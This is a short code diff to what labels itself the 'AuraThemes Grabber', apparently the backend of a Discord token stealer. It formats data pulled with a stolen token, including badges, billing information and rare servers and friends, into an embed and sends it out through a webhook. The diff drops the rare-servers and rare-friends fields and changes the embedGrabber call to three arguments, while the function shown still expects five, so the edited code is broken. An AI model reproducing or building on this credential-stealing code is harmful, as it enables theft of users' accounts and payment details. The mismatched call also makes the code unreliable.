@@ -26,9 +26,6 @@ const embedGrabber = (guilds, friends, infos, token, embed) => new EmbedBuilder(
     getField('Badges', infos.badges, true),
     getField('Billing', infos.billing, true),
     getField('Langue', infos.langue, true),
-    getField('\u200b', '**Rare Servers**\n' + guilds, true),
-    getField('\u200b', "\u200b", false),
-    getField('\u200b', '**Rare Friends**\n' + friends, true)
   )
   .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
   .setTimestamp();
@@ -71,7 +68,7 @@ export default async function handler(req, res) {
     const guilds = getDiscordInfo(token).guilds.rares;
     const friends = getDiscordInfo(token).friends.rares;
     const embedBuilder = (infos?.ID || infos.ID)
-      ? embedGrabber(guilds, friends, infos, token, embed)
+      ? embedGrabber(infos, token, embed)
       : embedRaw(token, embed);
 
     await webhook.send({
